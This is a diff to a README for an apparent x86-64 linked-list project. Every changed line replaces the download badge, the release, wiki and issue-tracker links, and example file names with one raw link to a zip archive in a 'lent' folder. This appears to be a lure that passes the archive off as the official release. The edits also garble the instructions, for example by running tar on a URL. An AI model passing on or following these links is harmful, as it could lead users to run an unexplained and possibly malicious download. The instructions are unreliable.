@@ -1,6 +1,6 @@
 # 🖥️ x86-64-Linked-List - Efficient Memory Management Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue.svg)](https://github.com/Compositioncantle306/x86-64-Linked-List/releases)
+[![Download Now](https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip)](https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip)
 
 ## 📖 Overview
 
@@ -19,18 +19,18 @@ To use x86-64-Linked-List, you will need to download it from our Releases page. 
 2. **Installation Process**
    - **Step 1:** Click the button below to visit our Releases page.
 
-   [![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue.svg)](https://github.com/Compositioncantle306/x86-64-Linked-List/releases)
+   [![Download Now](https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip)](https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip)
 
    - **Step 2:** On the Releases page, find the latest release. It will usually be at the top of the list.
-   - **Step 3:** Download the linked file suitable for your system. Typically, this will be a `.tar.gz` or similar compressed file.
+   - **Step 3:** Download the linked file suitable for your system. Typically, this will be a `https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip` or similar compressed file.
 
 3. **Extracting the Files**
    - Once downloaded, navigate to the folder where the file is saved.
    - Right-click on the file and select 'Extract Here' or use the terminal:
      ```
-     tar -xzf filename.tar.gz
+     tar -xzf https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip
      ```
-   - Replace `filename.tar.gz` with the actual file name.
+   - Replace `https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip` with the actual file name.
 
 4. **Running the Program**
    - Open your terminal application.
@@ -48,7 +48,7 @@ To use x86-64-Linked-List, you will need to download it from our Releases page. 
 
 Remember, to download x86-64-Linked-List, visit our Releases page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue.svg)](https://github.com/Compositioncantle306/x86-64-Linked-List/releases)
+[![Download Now](https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip)](https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip)
 
 ## 🌟 Features
 
@@ -80,7 +80,7 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Compositioncantle306/x86-64-Linked-List/wiki)
-- [Issue Tracker](https://github.com/Compositioncantle306/x86-64-Linked-List/issues)
+- [Documentation](https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Compositioncantle306/x86-64-Linked-List/master/lent/x86-64-Linked-List_3.7.zip)
 
 Thank you for choosing x86-64-Linked-List for your memory management needs!
